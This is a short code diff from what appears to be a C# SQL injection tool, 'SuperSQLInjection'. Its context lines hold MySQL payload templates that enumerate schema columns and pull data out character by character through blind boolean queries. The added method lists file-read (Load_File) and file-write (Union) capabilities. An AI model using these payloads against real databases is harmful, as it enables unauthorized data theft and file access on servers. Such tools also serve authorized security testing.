@@ -28,8 +28,6 @@ namespace SuperSQLInjection.payload
         //获取列名称
         public static String column_value = "(select column_name from information_schema.columns where table_schema='{dbname}' and table_name='{table}' limit {index},1)";
 
-
-
         public static String bool_length = "char_length({data})";
         public static String bool_value = "ascii(mid({data},{index},1))";
         public static String mid_value = "(mid({data},{index},1))";
@@ -369,6 +367,16 @@ namespace SuperSQLInjection.payload
         {
             String data = data_value_orderBy.Replace("{columns}", column).Replace("{orderby}", orderBy).Replace("{dbname}", dbName).Replace("{table}", table).Replace("{index}", index + "");
             return data;
+        }
+        /// <summary>
+        /// 反射条调用，加载显示支持的文件操作
+        /// </summary>
+        /// <returns></returns>
+        public static List<String> getShowCanDoFile() {
+            List<String> list = new List<String>();
+            list.Add("MySQL Load_File读文件");
+            list.Add("MySQL Union写文件");
+            return list;
         }
 
 
